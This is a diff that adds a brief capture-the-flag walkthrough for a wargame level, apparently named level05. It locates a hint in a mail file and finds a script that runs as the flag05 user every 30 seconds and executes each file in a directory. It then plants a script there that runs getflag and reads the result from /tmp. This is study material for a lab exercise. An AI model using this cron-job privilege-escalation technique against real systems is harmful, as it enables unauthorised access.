@@ -1,0 +1,13 @@
+find / -type f -name "*level05*"  2>&-
+
+cat /var/mail/level05
+
+show a script that execute something every 30s with flag05 user
+
+cat /usr/sbin/openarenaserver
+
+this script contain loop over file in a directory and execute them with bash -x 
+
+create a script in this directory which contain -> 'getflag > /tmp/please'
+
+wait 30s and you can cat /tmp/please
